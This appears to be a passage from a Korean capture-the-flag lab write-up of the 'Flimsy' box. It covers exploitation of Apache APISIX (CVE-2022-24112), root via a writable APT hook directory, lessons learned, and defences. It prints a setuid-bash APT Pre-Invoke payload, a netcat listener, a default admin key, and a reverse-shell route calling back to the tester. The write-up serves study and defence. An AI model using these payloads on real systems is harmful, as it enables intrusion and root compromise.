**이 경로는 실제로 사용하지 않았다** — root 를 잡은 뒤에 발견했으므로 권한상승 수단이 될 수 없었다. `[가정]`: `/root` 의 퍼미션이 `755` 였다면 이쪽이 apt 훅보다 빠른 경로였을 것이다.

또 이 스크립트가 §3 의 관측을 설명한다. APISIX 를 root 가 `/root` 에서 띄우므로 셸의 cwd 가 `/root` 였고, `/etc/passwd`·`shadow`·`group` 이 매분 백업본으로 덮여쓰기 때문에 **`/etc/passwd` 에 사용자를 추가하는 고전 경로는 60초 안에 지워진다.**

### 관리 키 3차 확인

```
### apisix config etcd/admin
34:  admin_key:
35-    - name: admin
36:      key: edd1c9f034335f136f87ad84b625c8f1  # using fixed API token has security risk, please update it when you deploy to production environment
37-      role: admin
```

기본 키가 그대로였고, 주석은 벤더가 직접 "바꿔 쓰라"고 적어둔 것이다. 아무도 안 바꿨다.

## 5. 플래그

> [!warning] 2026-08-20 인스턴스의 값이다
> PG 는 박스를 켤 때마다 플래그를 새로 만든다. 두 파일 모두 mtime 이 `Aug 20 12:18` 로 이번 인스턴스 생성 시각이다.

### user — `/home/franklin/local.txt`

`~` 가 `/home/frank` 로 잘못 잡혀 있어 `cat ~/local.txt` 는 실패한다. 절대경로로 읽어야 한다.

출처: `~/PG/Flimsy/proof_user.txt`

```
franklin@flimsy:/root$ cd /home/franklin; whoami; id; hostname; hostname -I; dat
e; cat /home/franklin/local.txt
cd /home/franklin; whoami; id; hostname; hostname -I; date; cat /home/franklin/l
ocal.txt
franklin
uid=65534(franklin) gid=65534(nogroup) groups=65534(nogroup)
flimsy
192.168.248.220
Thu Aug 20 12:28:10 UTC 2026
ad396f9bb652fedd964f20285dab04cd
franklin@flimsy:/home/franklin$
```

### root — `/root/proof.txt`

출처: `~/PG/Flimsy/proof_root.txt`

```
root@flimsy:/tmp# /usr/bin/whoami; /usr/bin/id; /bin/hostname; /bin/hostname -I;
 /bin/date; /bin/cat /root/proof.txt
/usr/bin/whoami; /usr/bin/id; /bin/hostname; /bin/hostname -I; /bin/date; /bin/c
at /root/proof.txt
root
uid=65534(franklin) gid=65534(nogroup) euid=0(root) groups=65534(nogroup)
flimsy
192.168.248.220
Thu Aug 20 12:33:22 UTC 2026
0c8587812f2ae784dbb5642833405d2e
root@flimsy:/tmp#
```

둘 다 리버스셸에서 원위치 `cat` 으로 읽었다. 웹셸이 아니다.
(위 두 블록은 `tmux capture-pane` 원문이라 80칸에서 줄이 접혀 있다. 접힘은 캡처 그대로다.)

미끼 플래그는 **찾아본 적이 없다.** franklin 시점에 돌린 `find / -name local.txt -o -name proof.txt` 는 `/home/franklin/local.txt` 하나만 줬고(그때는 `/root` 를 읽을 수 없었다), root 로 올라온 뒤에는 `harvest_root.txt` 의 `===== FLAGS =====` 도 같은 한 줄뿐이다. `flag*` 같은 다른 이름으로는 훑지 않았으므로 "미끼가 없다"가 아니라 **관측이 없다**가 맞다.

## 6. 막혔던 지점 / 시행착오

전체 소요는 21:22 시작 → 21:28 user → 21:33 root, 약 11분. 그 뒤 정리에서 더 오래 걸렸다.

### (1) top-1000 으로 판단할 뻔했다 — 위험도 최상

예열 스캔이 22·80·3306 만 줬다. 만약 `-p-` 를 기다리지 않고 80 번 gobuster 와 MySQL 브루트포스로 갔으면 몇 시간을 태웠다. **`-p-` 결과 전에는 판단을 시작하지 않는다**가 이 박스의 첫 교훈이다.
80 번은 완전한 미끼였다 — 정적 템플릿, 동적 엔드포인트 0개.

### (2) `nc | tee` 버퍼링을 셸 사망으로 오독할 뻔했다 — 약 1분

처음 리스너를 이렇게 띄웠다.

```
sudo rlwrap nc -lvnp 443 2>&1 | tee shell443.log
```

셸은 붙었다(`connect to ... 60714`). 그런데 `id` 를 쳐도 화면에 아무것도 안 나왔다.

판별을 로그 파일로 했다.

```
-rw-rw-r-- 1 kali kali 94 Aug 20 21:26 shell443.log
listening on [any] 443 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.220] 60714
```

94바이트 = nc 배너뿐. **`tee` 가 블록 버퍼링이라 4KB 가 안 차면 아무것도 흘려보내지 않는다.** 셸이 죽은 게 아니라 출력이 갇힌 것이다.

> [!warning] 위 블록은 복원본이다
> `shell443.log` 는 21:52 에 내가 실수로 지웠다가 세션 기록의 원문으로 되살린 파일이다. 인용한 `Aug 20 21:26` 은 **관측 당시의 mtime** 이고, 현재 디스크상의 mtime 은 **21:55**(복원 시각)다. 내용은 `wc -c` = 94 로 원본과 같다. 경위와 교훈은 아래 (6).

판별법: 로그 파일 크기가 배너 크기에서 늘지 않으면 버퍼 문제다. 셸이 죽었으면 nc 가 종료되고 tmux 페인이 프롬프트로 돌아온다.

조치는 tmux 세션 이름으로만 종료 → `tee` 없이 재기동 → **라우트가 살아 있으니 재트리거만으로 새 셸.** 익스플로잇이 지속적 상태를 남기는 종류면 셸을 잃어도 싸게 복구된다.

### (3) `printf` 훅 파일이 깨졌다 — 약 1분

```
franklin@flimsy:/tmp$ printf %s\n "APT::Update::Pre-Invoke {\"cp /bin/bash /tmp/
rootbash; chown root:root /tmp/rootbash; chmod 4755 /tmp/rootbash\";};" > /etc/a
pt/apt.conf.d/99zzpwn; cat /etc/apt/apt.conf.d/99zzpwn; ls -l /etc/apt/apt.conf.
d/99zzpwn
...
APT::Update::Pre-Invoke {"cp /bin/bash /tmp/rootbash; chown root:root /tmp/rootb
ash; chmod 4755 /tmp/rootbash";};n-rw-rw-rw- 1 franklin nogroup 114 Aug 20 12:30
```

끝에 `;};n` — 리터럴 `n` 이 붙었다. `tmux send-keys` 를 거치며 `printf '%s\n'` 의 백슬래시가 벗겨져 포맷 문자열이 `%sn` 이 됐다.

**원격에 설정 파일을 만들 때 send-keys 로 인용부호를 통과시키지 마라.** Kali 에서 파일을 만들고 `curl` 로 내려받는 게 언제나 싸다. 검증은 `cat -A`:

```
APT::Update::Pre-Invoke {"cp /bin/bash /tmp/rootbash; chown root:root /tmp/rootb
ash; chmod 4755 /tmp/rootbash";};$
```

`$` 로 끝나면 정상.

### (4) gobuster 를 끄는 걸 잊어 41만 요청을 남겼다

21:23 에 켠 gobuster 를 21:38 까지 방치했다. 흔적 확인에서 튀어나왔다.

출처: `~/PG/Flimsy/traces_nginx.log`

```
### nginx logs present
-rw-r----- 1 www-data adm 43040628 Aug 20 12:36 access.log
### total lines access.log
419537 /var/log/nginx/access.log
### fixed-string count of our IP
419573
```

43MB. 숫자를 세 번 세었는데 매번 달랐다.

| 시각(KST) | 값 | 어디서 |
|---|---|---|
| 21:35 | 395,013 | `traces_confirmed.log` — `### nginx access (80) my hits` |
| 21:36 | 419,537 | `traces_nginx.log` — `wc -l` 로 전체 행수 |
| 21:36 | 419,573 | `traces_nginx.log` — `grep -F` 로 우리 IP 행 |

초고는 이걸 "`grep -c` 가 이상한 값을 줘서 `grep -F` 로 다시 셌다"로 적었는데 **틀렸다.** 세 값의 차이는 grep 종류가 아니라 **로그가 계속 자라고 있었던 것**이다. 1분 사이에 24,560행이 늘었고(≈400 req/s), `wc -l` 보다 `grep -F` 가 36행 많은 것도 두 명령 사이의 몇 초 차이다. 우리 IP 행이 전체 행수보다 많다는 것 자체가 "파일이 움직이고 있다"는 신호였다.

원인은 실제 줄을 눈으로 봐서 확정했다.

```
192.168.45.207 - - [20/Aug/2026:12:23:41 +0000] "GET /15a7cc66-f735-4b27-b0a7-414898cd12b3 HTTP/1.1" 404 134 "-" "gobuster/3.8"
```

**로그를 세는 동안 로그가 자라면 어떤 카운트도 스냅샷이 아니다.** 값이 서로 안 맞으면 도구를 의심하기 전에 파일이 정지 상태인지부터 봐라.
경로가 43500 으로 확정된 21:25 시점에 껐어야 했다.

### (5) 리버스셸 페인에 `C-c` 를 보내 root 셸을 날렸다 — 복구 실패

정리 단계에서 43500 이 응답을 멈췄다. 타겟 안에서 `127.0.0.1:43500` 을 때려도 같았다. hung `curl` 을 끊으려고 tmux 페인에 `C-c` 를 보냈는데, **그게 원격 curl 이 아니라 로컬 `nc` 를 죽여** 셸까지 함께 날아갔다.

알아챈 방법은 단순했다. 페인에 `id` 를 쳤더니 `uid=1000(kali)` 가 돌아왔다 — **프롬프트가 타겟이 아니라 Kali 로 돌아와 있었다.** (초고는 이 자리에 `┌──(kali㉿kali)` 프롬프트가 붙은 코드블록을 넣어뒀는데, 이 박스의 Kali 명령은 전부 비대화형 `ssh kali "..."` 로 돌렸으므로 그런 프롬프트가 찍힐 자리가 없다. 창작이라 걷어냈다.)

재획득을 4회 시도했다(21:43~21:47). 전부 무응답 — APISIX 가 뻗어서 `/pwn1` 라우트 자체가 안 먹는다. TCP 는 붙는데 HTTP 응답이 없다. 아래는 그때 화면이고 **파일로 보존하지 못했다** — 셸을 잃은 뒤의 확인이라 산출물이 얇다.

```
--- plain GET / on 43500 ---
http=000 time=12.002099
--- port state ---
PORT      STATE SERVICE         VERSION
9443/tcp  open  tungsten-https?
43500/tcp open  unknown
```

22·80·3306 과 ping 은 정상이었으므로 네트워크가 아니라 APISIX 프로세스 문제다.

`[가정]` 매분 도는 `run.sh` 가 `nohup etcd &` 와 `apisix start` 를 반복 실행하는 데다 gobuster 41만 요청이 겹쳐 뻗었다고 본다. **셸을 잃은 뒤의 추정이고 실측으로 확인하지 못했다.** 오히려 반대 증거가 하나 있다 — 12:33 에 뜬 `harvest_root.txt` 의 프로세스 목록에는 `etcd` **한 개**와 APISIX nginx 워커 **두 개**뿐이다. 12:16 부터 17번 돌았는데도 누적이 안 보인다(뒤에 뜬 etcd 는 2379 바인딩에 실패해 바로 죽었을 것이다). 그러니 "인스턴스 누적"보다 **gobuster 부하** 쪽이 유력하지만, 그것도 확인한 것이 아니다.

교훈 셋:
- **리버스셸 페인의 `C-c` 는 원격이 아니라 `nc` 를 죽인다.** hung 명령은 페인을 버리지 말고 다른 경로(별도 셸)로 우회했어야 했다
- **정리는 셸이 건강할 때 먼저 끝낸다.** 플래그 확보 직후 순서는 "산출물 저장 → 정리 → 추가 열거"였어야 했다
- **재진입 수단을 하나 확보해 두는 값어치**가 이것이다. root 를 잡았을 때 `/etc/shadow` 나 `/root/.ssh` 를 챙겼으면 SSH(`PermitRootLogin yes`, `PasswordAuthentication yes`)로 돌아갈 수 있었다. 안 챙겨서 못 돌아갔다

### (6) 산출물을 "정리"하다 실패의 증거를 지웠다 — 복원

플래그를 다 따고 21:52 에 `~/PG/Flimsy/` 를 훑어보다가 두 파일을 지웠다. `shell443.log`(94바이트, nc 배너뿐)와 `routes_after_cleanup.json`(0바이트). **둘 다 "내용이 없어 보여서" 지웠고, 정확히 그래서 증거였다.**

- `shell443.log` 가 94바이트인 것 자체가 **(2) 의 `tee` 버퍼링 실패의 증거**다. 셸은 붙었는데 배너 이후로 한 바이트도 안 늘었다는 뜻이니까
- `routes_after_cleanup.json` 이 0바이트인 것 자체가 **(5) 의 정리 실패의 증거**다. APISIX 가 응답을 안 해서 삭제 후 라우트 목록을 받아올 수 없었다는 뜻이니까

복원 방식은 이랬다. 되살릴 때도 **원본과 뭐가 다른지를 같이 남겨야** 인용할 수 있다.

| 파일 | 복원 | 검증 | 원본과 다른 점 |
|---|---|---|---|
| `shell443.log` | 세션 기록에 남은 원문을 그대로 다시 씀 | `wc -c` = **94** — 원본과 같은 크기 | **mtime 이 21:55**(원본 21:26). 노트가 인용하는 자리에 그 사실을 적었다 |
| `routes_after_cleanup.json` | 0바이트로 재생성 | 크기 0 — 애초에 내용이 있었던 적이 없다 | mtime 만 21:55 |

일반화하면 이렇다. **정리 충동이 향하는 파일이 바로 6장 재료다.** 성공 산출물은 크고 뿌듯해서 안 지운다. 지우고 싶어지는 건 언제나 **작고, 비어 있고, 실패를 담은 파일**이고, 시행착오 장은 정확히 그것으로 쓰인다. `~/PG/<박스>/` 에서는 **선별하지 마라** — 특히 0바이트 파일은 "빈 파일"이 아니라 "빈 응답을 받았다는 기록"이다.

그리고 복원본을 인용할 거면 **복원본이라고 밝혀라.** mtime 하나가 어긋난 채로 실측인 척하면 그 노트의 다른 시각 기록까지 같이 의심받는다.

## 7. OSCP 시험 관점

1. **`-p-` 를 기다리는 것이 이 박스의 전부다.** 43500 은 `nmap-services` 에 등재조차 없어 `--top-ports` 를 아무리 키워도 안 나온다(§1). 예열 스캔은 "먼저 볼 것"을 정하는 용도지 **"없다"를 판정하는 용도가 아니다.** 난이도가 Fundamental 인데도 전 포트 스캔 없이는 **시작조차 못 하는** 박스다. 쉬운 박스일수록 정찰을 줄이고 싶어지는데 그 유혹이 정확히 여기서 비용이 된다.
2. **403 은 정보다.** 관리 API 가 403 을 주면 IP 기반 인가가 켜져 있다는 뜻이다. 그때 찾을 것은 둘이다 — ① `X-Real-IP`·`X-Forwarded-For`·`X-Originating-IP` 로 그 판정을 속일 수 있는가, ② **같은 서비스 안에 요청을 대신 발행해주는 기능이 있는가**(batch·webhook·proxy·health-check·import-from-URL). 이 박스의 답은 ②였다. 서버가 자기 자신에게 거는 요청은 어차피 루프백에서 오므로, IP 허용목록이 통째로 무의미해진다.
3. **기본 자격증명은 웹 로그인 폼에만 있는 게 아니다.** API 토큰·관리 키도 기본값이 있고, 문서에 그대로 적혀 있다. 서비스를 식별했으면 "이 제품의 기본 관리 토큰이 뭔가"를 검색하라.
4. **자동 도구 없이 같은 결과** — 이 박스는 처음부터 수동이었다. `curl` 로 batch-requests 한 번 때려보는 것이 전부고, `exploit_apisix.py` 는 삼중 인용 때문에 쓴 것이지 자동화가 아니다. §3 의 `try1_batch_probe.sh` 는 `curl` 한 줄이고 그대로 시험장에서 쓸 수 있다.
5. **권한상승 반사 5개 중 답이 두 개에 있었다** — `crontab -l`/`/etc/crontab` 과 "쓰기 가능한 경로". `sudo -l`·`find -perm -4000`·`getcap` 은 셋 다 빈손이었다. **셋이 빈손이면 그때가 크론과 쓰기권한을 볼 차례다.**
6. **`find / -writable -type d` 를 반사에 넣어라.** 이 박스는 그 한 줄에 답이 있었다. 특히 `/etc/` 아래 쓰기 가능한 디렉터리는 거의 항상 권한상승이다.
7. **시간 배분** — 43500 을 확인한 21:25 부터 root 까지 8분이었다. 반대로 손절 기준은 명확하다. **`-p-` 를 다 보고도 알려진 취약 버전이 없으면** 그때가 자격증명·웹 열거로 돌아갈 시점이다.
8. **정리를 성공 직후에 하라.** 이 박스에서 유일하게 실패한 것이 정리다(§6-5). 시험에서는 채점에 안 들어가지만, 실무 보고서에서는 "제거하지 못한 아티팩트"를 적어야 한다.

## 8. 방어 관점

- **기본 관리 키를 바꾼다.** `config.yaml` 의 `admin_key` 는 설치 시 필수 변경 항목이다. 벤더가 주석으로까지 경고하고 있었다.
- **Admin API 를 데이터플레인 포트에서 분리한다.** APISIX 는 `port_admin` 으로 관리 API 를 별도 포트에 둘 수 있다. 그러면 43500 이 외부에 열려 있어도 관리면은 노출되지 않는다.
- **`batch-requests` 를 비활성화하거나 2.12.1 / 2.10.4 이상으로 올린다.** 이 버전들에서 하위 요청의 클라이언트 IP 를 호출자 헤더가 아니라 실제 연결에서 가져오도록 고쳐졌다.
- **인가를 헤더로 판정하지 않는다.** `X-Real-IP` 는 신뢰된 프록시가 붙였을 때만 의미가 있다. 프록시 앞단에서 이 헤더를 무조건 제거·재작성해야 한다.
- **`/etc/apt/apt.conf.d` 를 `755 root:root` 로 되돌린다.** 이 박스의 `777` 은 정상 설치에서 나올 수 없는 값이다.
- **`/root/run.sh` 의 `777` 도 마찬가지.** root 크론이 실행하는 스크립트는 root 만 쓸 수 있어야 한다.
- **게이트웨이 워커를 `nobody` 로 두더라도 그것이 방어가 아니다.** 이 박스에서 `franklin`(uid 65534) 은 아무 특권도 없었지만, 로컬 접근 자체가 크론+퍼미션 결함으로 root 가 됐다.

## 9. 참고 자료

- CVE-2022-24112 — Apache APISIX `batch-requests` 플러그인의 클라이언트 IP 제한 우회. 영향 범위: APISIX 1.3 ~ 2.12.0, 2.10.x LTS 는 2.10.4 미만
- Apache APISIX Admin API / `filter_func` 라우트 스키마 문서 — `filter_func` 가 Lua 로 평가된다는 것이 이 익스플로잇의 근거
- `APT::Update::Pre-Invoke` — `apt.conf(5)`. `apt-get update` 전에 실행되는 셸 명령 목록
- Apache APISIX 2.8 `conf/config-default.yaml` — `allow_admin` · `admin_key` 기본값의 1차 사료
- 이 박스 산출물: `~/PG/Flimsy/` (Kali, 26개 파일) — `nmap_quick.log`, `nmap.log`, `gobuster_root.txt`/`.full.txt`, `try1_batch_probe.sh`/`.log`, `try2_route_create.log`, `routes_preexisting.json`, `exploit_apisix.py`, `apt_hook_99zzpwn.conf`, `pane_full.txt`, `pane_root.txt`, `harvest_franklin.txt`, `harvest_root.txt`, `root_context.txt`, `proof_user.txt`, `proof_root.txt`, `traces_confirmed.log`, `traces_nginx.log`, `shell443.log`, `writeup_notes.txt`

## 남긴 흔적

**되돌린 것** (`ls` 로 부재 확인 완료)

```
/bin/ls: cannot access '/etc/apt/apt.conf.d/99zzpwn': No such file or directory
/bin/ls: cannot access '/tmp/rootbash': No such file or directory
/bin/ls: cannot access '/tmp/h.sh': No such file or directory
/bin/ls: cannot access '/tmp/.h': No such file or directory
```

훅을 먼저 지우고 한 크론 사이클을 기다린 뒤 `rootbash` 를 지웠다. 순서를 반대로 하면 다음 분에 다시 생성된다.

**되돌리지 못한 것**

- **APISIX 라우트 `id=pwn1`** (`uri=/pwn1`, `filter_func` 안에 `192.168.45.207:443` 리버스셸) — **삭제 확인 못 함. 박스 정지로 해소.**

  두 가지를 섞지 않고 적는다.

  | | |
  |---|---|
  | **내가 한 것** | 21:38 에 `batch-requests` 로 DELETE 를 **한 번** 보냈다. **응답을 받지 못했다.** 직후 APISIX 가 응답 불능이 되어 `routes_after_cleanup.json` 이 0바이트로 남았고, **삭제됐는지 남았는지 검증할 수 없게 됐다** |
  | **어떻게 해소됐나** | 작업 종료 후 **박스가 정지·리버트되면서** 라우트가 사라졌다. **내가 지운 것이 아니다** |

  검증이 불가능해진 시점에 「남아 있다고 가정」으로 두었다. 안전한 쪽으로 틀리는 판단이고 그건 옳았다 — 남의 IP 도 아닌 **내 LHOST 로 나가는 리버스셸을 라우트에 심어놓고** "아마 지워졌을 것"으로 넘기면, 다음 사람이 그 박스에서 정체불명의 connect-back 을 보게 된다.

  **「확인된 삭제」와 「리버트로 사라짐」은 전혀 다른 정보다.** 실무였다면 여기서 끝나지 않는다 — 환경이 초기화되지 않는 곳이라면 재접근 수단을 확보해서라도 직접 확인했어야 할 항목이다
- **APISIX 서비스 자체가 응답 불능 상태**로 남았다(43500 TCP open, HTTP 무응답). 21:36 KST = 12:36 UTC 이후. **우리가 죽였을 가능성이 높다** — gobuster 41만 요청이 겹친 시점과 맞는다. 다만 원인은 `[가정]` 수준이고 실측으로 확인하지 못했다(§6-5). 서비스 가용성을 깬 것은 그 자체로 보고 대상이다

**로그에 남은 것** (확인만 하고 삭제하지 않았다)

- `/var/log/nginx/access.log` — 우리 IP 로 **419,573행**, 파일 43,040,628 바이트(43MB). 거의 전부 gobuster 다. 지우지 않았다 — 「남긴 흔적」이 요구하는 건 지우는 게 아니라 **무엇을 남겼는지 알고 적는 것**이다. 다만 규모는 직시해야 한다. 단일 IP 에서 15분간 42만 요청이면 로그 용량이 하루치의 수백 배로 튀고, 어떤 모니터링이 붙어 있어도 **탐지된다.** 실무 침투에서라면 이 시점에 작업이 끝난다
- `/usr/local/apisix/logs/access.log` — 우리 IP 로 **49행**
- `/var/log/auth.log` — 우리 세션 항목 **없음**. CRON 세션만 기록돼 있다. 리버스셸은 PAM 을 거치지 않는다
- `wtmp`(`last`) — 우리 항목 **없음**. pty 로그인이 아니기 때문이다
- `/var/log/apt/history.log` — **우리 항목 없음.** 초고는 "훅이 걸려 있던 동안의 `apt-get update` 항목"이 남았다고 적었는데 틀렸다. `apt-get update` 는 history.log 에 아무것도 쓰지 않는다(Kali 에서 실행 전후 diff 로 확인 — 무변화). 이 파일에 있는 것은 같은 시간대의 `unattended-upgrade` 항목들이고 박스가 스스로 돌린 것이다. 훅은 `Pre-Invoke` 라 더더욱 남지 않는다

**확인하지 않은 것** — `/var/log/syslog`, `btmp`, APISIX `error.log` 는 열어보지 않았다. 셸을 잃은 뒤라 확인이 불가능해졌다.

**Kali 쪽** — tmux 세션 전부 종료(`no server running`), 80/443/8080 리스너 없음, `/tmp/wwwfli` 삭제 확인.

## 관련 노트

- [[Astronaut]] — 크론 발화형 권한상승. "파일을 쓴 시각과 코드가 도는 시각이 다르다"가 같은 형태
- [[Exfiltrated]] · [[Muddy]] — 크론 기반 권한상승 누적 패턴
- [[Hub]] · [[Levram]] · [[RubyDome]] · [[Squid]] — "버전 판정은 독립 근거 2개" 누적 패턴
- [[Crane]] · [[RubyDome]] · [[Squid]] — "응답이 성공을 뜻하지 않는다". 이 박스에서는 반대 방향이었다. **트리거의 타임아웃이 실패가 아니라 성공의 정상 형태**였고, batch-requests 는 **바깥 200 과 안쪽 status 를 따로 봐야** 했다
